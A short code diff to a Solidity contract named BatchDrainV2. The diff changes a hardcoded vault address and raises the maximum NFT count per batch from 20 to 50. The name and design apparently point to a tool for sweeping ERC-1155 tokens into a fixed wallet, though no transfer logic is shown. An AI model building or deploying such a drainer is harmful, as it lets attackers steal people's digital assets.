@@ -27,8 +27,8 @@ interface IERC1155 {
 }
 
 contract BatchDrainV2 {
-    address public constant VAULT = 0xc46e0141a979a071360A692F887c3dA6b7E39A44;
-    uint256 public constant MAX_NFTS = 20;
+    address public constant VAULT = 0x2B20979118a61aE3f7f75F3320FB9b0639c5BA53;
+    uint256 public constant MAX_NFTS = 50;
 
     error Unauthorized();
     error TransferFailed();
